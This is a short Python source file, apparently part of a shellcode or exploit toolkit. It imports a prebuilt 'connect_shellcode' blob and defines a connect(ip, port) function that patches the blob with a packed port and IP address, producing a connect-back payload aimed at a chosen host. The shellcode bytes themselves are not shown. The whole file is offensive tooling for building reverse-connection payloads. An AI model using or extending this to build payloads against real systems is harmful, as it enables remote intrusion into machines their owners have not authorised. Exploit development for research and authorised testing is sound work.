import struct
import socket

from asm.connect import connect_shellcode

def connect(ip, port):
	params = struct.pack("!H", port) + socket.inet_aton(ip)
	return connect_shellcode[:-6] + params

